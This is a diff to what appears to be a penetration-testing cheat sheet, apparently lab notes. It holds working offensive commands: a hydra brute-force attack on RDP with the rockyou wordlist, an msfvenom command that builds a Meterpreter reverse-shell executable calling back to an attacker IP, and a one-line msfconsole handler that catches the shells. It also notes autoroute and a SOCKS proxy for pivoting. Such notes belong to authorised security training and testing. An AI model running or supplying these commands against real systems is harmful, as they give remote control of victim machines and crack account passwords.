@@ -3085,14 +3085,8 @@ hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
  	Meterpreter Reverse Shell 32-bit Windows:
   		msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=192.168.45.237 LPORT=5555 --arch x86 --platform windows -f exe -o reverse_32bit.exe 
 
-    sudo msfconsole -q
-    use multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST $ip_address
-    set LPORT 443
-    set exitonsession false
-    run -j
-
+	Quick Access: sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST 192.168.45.237;set LPORT 5555;run;"
+	Note: It may take several times for a session to be initiated.
 
 	Once session is opened: We can use multi/manage/autoroute and auxilliary/server/socks_proxy 
 
